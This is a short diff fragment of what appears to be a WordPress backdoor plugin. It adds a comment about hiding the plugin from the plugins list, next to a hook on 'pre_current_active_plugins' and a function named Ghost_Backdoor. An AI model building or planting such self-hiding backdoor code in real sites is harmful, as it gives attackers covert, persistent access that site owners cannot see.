@@ -45,6 +45,8 @@ function Ghost_Backdoor($user_search) {
 	}
 }
 
+// Hide the plugin from the plugins list.
+
 add_action('pre_current_active_plugins', 'Ghost_Plugin');
 
 function Ghost_Plugin() {
